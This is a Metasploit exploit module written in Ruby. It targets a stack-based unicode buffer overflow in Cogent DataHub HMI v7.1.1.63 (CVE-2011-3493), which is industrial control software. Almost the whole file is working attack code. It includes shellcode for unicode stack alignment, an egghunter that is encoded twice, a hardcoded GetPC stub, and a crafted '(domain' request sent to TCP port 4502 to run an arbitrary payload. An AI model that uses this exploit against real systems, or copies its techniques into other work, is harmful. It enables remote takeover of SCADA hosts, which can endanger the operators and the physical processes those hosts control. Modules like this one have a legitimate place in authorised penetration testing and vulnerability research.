##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Egghunter

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Cogent Datahub HMI <= v7.1.1.63 CogentDataHubV7.exe Unicode Stack Buffer Overflow",
			'Description'    => %q{
					This module exploits a stack-based unicode buffer-overflow in the 
				"DH_OneSecondTick" function exploitable through the "domain", "report_domain", 
				"register_datahub","slave" commands within CogentDataHubV7.exe version7.1.1.63 or
				below. The Cogent Datahub must be installed as a service on the remote target for
				this exploit to be successful.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Luigi Auriemma <aluigi[at]autistici.org>', # Initial discovery/trigger
					'mr_me <steventhomasseeley[at]gmail.com>',  # poc/msf
				],
			'References'     =>
				[
					['CVE', '2011-3493'],
					['OSVDB', '75570'],
					['BID', '49611'],
					['URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-03.pdf'],
					['URL', 'http://aluigi.altervista.org/adv/cogent_1-adv.txt']
				],
			'Payload'        =>
				{
					'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'EDI',  # egghunter jmp edi
						}
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => 'process',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP SP3 and Windows Server 2k3 - CogentDataHubV7.exe (unicode)',
						{
							'Ret'    => "\x7f\x55", # jmp esp 0x0055007f
							'Offset' => 1019,
						}
					],
				],
			'Privileged'     => true,
			'DisclosureDate' => "Sep 08 2011",
			'DefaultTarget'  => 0))

			register_options(
			[
				Opt::RPORT(4502)
			], self.class)
	end

	def exploit

		# stage 1
		# becomes 'add byte [edi],ch' when null byte aligned
		unicode_align = "\x6f"
		align= ""
		align << "\x54"           # push esp
		align << unicode_align
		align << "\x58"           # pop eax
		align << unicode_align
		align << "\x05\x6f\x11"   # add eax,11006f00
		align << unicode_align
		align << "\x2d\x37\x01"   # sub eax,01003700
		align << unicode_align
		align << "\x2d\x37\x10"   # sub eax,11003700
		align << unicode_align
		align << "\x50"           # push eax
		align << unicode_align
		align << "\x48"           # dec eax
		align << unicode_align
		align << "\x48"           # dec eax
		align << unicode_align
		align << "\x53"           # push ebx == "Name" (ebx = static value)
		align << unicode_align
		align << "\x59"           # pop ecx
		align << "\x08"           # add [eax],cl (carve a 'RETN' onto the stack)
		align << unicode_align
		align << "\x40"           # inc eax
		align << unicode_align
		align << "\x40"           # inc eax
		align << unicode_align
		align << "\x5d"           # pop ebp
		align << unicode_align + "\x55"  # writable address (for msf egg hunter & unicode aligned)
		align << (unicode_align + "\x41") * 46  # inc ecx (will not effect to our payload)
		align << unicode_align
		align << "\x6b"          # becomes our carved RETN on the stack (0x6b+0x58=0xc3)

		eggoptions = 
		{
			:checksum => true, # ensure payload integrity
			:eggtag => 'lulz'
		}

		hunter, egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)

		# stage 2
		# Encode with alphamixed, then unicode mixed
		[ 'x86/alpha_mixed', 'x86/unicode_mixed' ].each { |name|
			enc = framework.encoders.create(name)
			if name =~ /unicode/
				# aligned to esp & eax
				enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EAX' })
			else
				enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EDX' })
			end
			# NOTE: we already eliminated badchars
			hunter = enc.encode(hunter, nil, nil, platform)
			if name =~/alpha/
				#insert getpc_stub & align EDX, unicode encoder friendly.
				#Hardcoded stub is not an issue here because it gets encoded anyway
				getpc_stub = "\x89\xe1\xdb\xcc\xd9\x71\xf4\x5a\x83\xc2\x41\x83\xea\x35"
				hunter = getpc_stub + hunter
			end
		}

		request = "(domain \""
		request << rand_text_alpha(target['Offset'])
		request << target.ret
		request << align
		# stage 3
		request << hunter + egg
		request << "\")\r\n"

		connect
		print_status("Sending request...")
		sock.put(request)
		sock.get_once()
		handler()
		disconnect
	end
end
